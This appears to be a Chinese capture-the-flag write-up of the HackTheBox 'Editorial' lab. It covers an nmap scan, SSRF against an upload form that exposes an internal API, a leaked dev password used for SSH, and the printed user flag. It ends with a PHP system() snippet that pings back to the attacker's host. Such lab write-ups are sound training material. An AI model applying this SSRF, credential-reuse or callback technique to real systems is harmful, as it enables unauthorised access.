# 端口

```
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.20   
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-01 03:45 EDT
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.47s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/1%OT=22%CT=1%CU=44140%PV=Y%DS=2%DC=T%G=Y%TM=66825EC9
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=107%GCD=1%ISR=107%TI=Z%CI=Z%TS=B)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3
OS:=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   549.04 ms 10.10.16.1
2   256.72 ms editorial.htb (10.10.11.20)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.13 seconds

```

# SSRF

一个上传页面
![](Editorial_files/1.jpg)

fuzzing

![](Editorial_files/2.jpg)

![](Editorial_files/3.jpg)

设置payload
![](Editorial_files/4.jpg)

5000端口
![](Editorial_files/5.jpg)


测试5000端口
![](Editorial_files/8.jpg)

返回：
![](Editorial_files/9.jpg)

得到一个地址：
```
static/uploads/fe4cd07b-e570-4971-9d6e-388b62150947
```
访问上面的地址，返回一串json
![](Editorial_files/10.jpg)

暴露出一堆api
```
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

访问其中一个api

![](Editorial_files/6.jpg)


访问获取到的地址：
![](Editorial_files/7.jpg)

得到一段文字：
```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```


得到一个用户凭据：```dev: dev080217_devAPI!@```

可以登录ssh
```
┌──(root㉿kali)-[~/htb/Editorial]
└─# ssh dev@10.10.11.20         
The authenticity of host '10.10.11.20 (10.10.11.20)' can't be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.20' (ED25519) to the list of known hosts.
dev@10.10.11.20's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Jul  1 10:19:28 AM UTC 2024

  System load:  0.08              Processes:             226
  Usage of /:   60.3% of 6.35GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.10.11.20
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cat user.txt 
bead65f1153bf57312d182b416fd0050
dev@editorial:~$ 

```


http://editorial.htb/static/uploads/98c1817b-d7c7-4afe-9c42-8c31964ac88b


http://10.10.16.25/1675417209384.jpg

http://10.10.16.25/1.txt


http://10.10.16.25/3.jpg

ping 10.10.16.25 -c 4 


```
<?php

system("ping 10.10.16.25 -c 4");

```